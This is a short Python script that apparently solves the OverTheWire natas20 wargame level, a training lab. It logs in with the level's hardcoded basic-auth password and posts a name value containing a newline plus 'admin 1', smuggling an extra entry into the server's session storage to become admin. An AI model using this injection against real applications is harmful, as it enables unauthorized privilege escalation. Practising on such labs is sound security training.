import requests
from requests.auth import HTTPBasicAuth

HOST = 'http://natas20.natas.labs.overthewire.org/index.php?debug=1'
auth = HTTPBasicAuth('natas20', 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF')

r = requests.get(HOST, auth=auth)
cookies = dict(PHPSESSID=r.cookies['PHPSESSID'])
data = dict(name='belvedere\nadmin 1')
r = requests.post(HOST, data=data, cookies=cookies, auth=auth)
print r.content

r = requests.get(HOST, cookies=cookies, auth=auth)
print r.content


